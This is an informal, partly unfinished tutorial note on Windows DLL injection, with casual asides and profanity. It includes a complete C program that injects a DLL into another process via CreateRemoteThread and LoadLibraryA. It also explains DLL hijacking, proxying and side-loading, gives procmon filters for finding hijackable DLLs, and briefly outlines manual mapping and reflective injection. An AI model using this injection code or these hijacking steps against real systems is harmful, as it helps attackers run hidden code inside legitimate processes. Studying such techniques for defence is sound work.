
# DLL Injection 

DLL Injection is a technique that involves injecting a DLL into a running process, allowing this code to run in the targeted process context.

It can have legitimate uses, for example, for hot patching, however, it can also allow attackers to inject malicious code in a legitimate process.

## Basic DLL Injection  

DLL can be loaded in a program using the LoadLibrary API call, which returns a handle which can be used to get the adresses of the functions in the library (using the GetProcAddress call)

```C
#include <windows.h>
#include <stdio.h>

int main() {
    HMODULE hModule = LoadLibrary("example.dll");
    if(hModule == NULL) {
        printf("We did a fucky wucky :c\n");
        return -1;
    }
    printf("Loaded example.dll successfully :3");
    
    return 0;
}
```

But it is also possible to load the DLL into a remote process by creating a thread calling LoadLibrary in the remote process :
```C
#include <windows.h>
#include <stdio.h>

int main() {

    char *dllPath = "example.dll";

    // First, we need a handle on the target process
    DWORD targetPID = 1234; 
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
    if (hProcess == NULL) {
        printf("Failed to open the target process\n");
        return -1;
    }

    // Then allocate memory in the target process for the DLL path
    LPVOID dllPathRemotePtr = VirtualAllocEx(hProcess, NULL, strlen(dllPath), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (dllPathRemotePtr == NULL) {
        printf("Failed to allocate memory in target process\n");
        return -1;
    }

    // Fill this memory with the dll path
    BOOL writeSucceeded = WriteProcessMemory(hProcess, dllPathRemotePtr, dllPath, strlen(dllPath), NULL);
    if (!writeSucceeded) {
        printf("Failed to write in target process memory\n");
        return -1;
    }

    // Get the address of LoadLibrary in kernel32.dll
    LPVOID loadLibraryAddr = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
    if (loadLibraryAddr == NULL) {
        printf("Failed to get the address of LoadLibrary\n");
        return -1;
    }
    
    // Create a remote thread, starting at LoadLibrary, pointing at the dll path
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddr, dllPathRemotePtr, 0, NULL);
    if (hThread == NULL) {
        printf("Failed to create remote thread in target process\n");
        return -1;
    }

    printf("Successfully injected example.dll in remote process :3\n");
    return 0;
}
```

## DLL Hijacking 

DLL Hijacking is a technique where an attacker take advantage of Windows DLL loading process. 
If a program doesn't specify the full name of a DLL, windows will search for the DLL following this order :
- 1-The directory from which the application is loaded
- 2-The system directory
- 3-The 16-bit system directory
- 4-The Windows directory
- 5-The current directory
- 6-The directories in PATH 

> If the `SafeDllSearchMode` is desactivated, the current directory becomes the 2nd directory to be searched
> You can find the value in the registry at `HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager`

If an attacker places their own DLL earlier in the search order, *or if the actual DLL is not found*, it will be loaded in place of the actual DLL.
This requires that the malicious DLL exports the same functions than the actual DLL. This can be done easily with a technique known as __proxying__, where the malicious DLL load the actual DLL in order to keep most of its functionality.

The best way to find good candidates for hijacking is to use [procmon](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)from sysinternals.
After starting the tool, the first thing to do is set up a few filters to avoid getting overwhelmed with garbage.
I recommend setting up two filters as such :
```
If Path Ends With dll then Include
If Result Is NAME NOT FOUND then include
```

We should now see every single call for a dll which failed. Giving us a good list of potential hijacking targets.

## DLL Side-Loading
Another popular attack using DLL is DLL Side-Loading.
It's a fairly simple attack consisting as taking a legitimate executable, but copying it in a directory we control so our own DLL can be run first.

## Advanced DLL Injection techniques

### Manual Mapping
It is possible to avoid detection by not using LoadLibrary. However this is a very complex technique that requires manually mapping the dll into a process memory, resolving imports and relocations. 
It's a bit too complicated to detail right now, but i'll get back on it later, pinkie promise :3

For a (very) simplified overview : 
 - Loads the DLL as raw data in the target process
 - Map the DLL sections in the target process
 - Injects shellcode in the target process and executes it. The shellcode will relocate the DLL, rectify the imports, execute the TLS callbacks and finally call the DLL Main.

// TODO so i find it later

(Good videos on the subject, part 1 of 4 tho 💀)
https://youtu.be/qzZTXcBu3cE
### Reflective DLL Injection
Even more complicated omg i feel so stupid rn help me

fuck it do it yourself i' so tired of this shit
https://github.com/stephenfewer/ReflectiveDLLInjection


## 

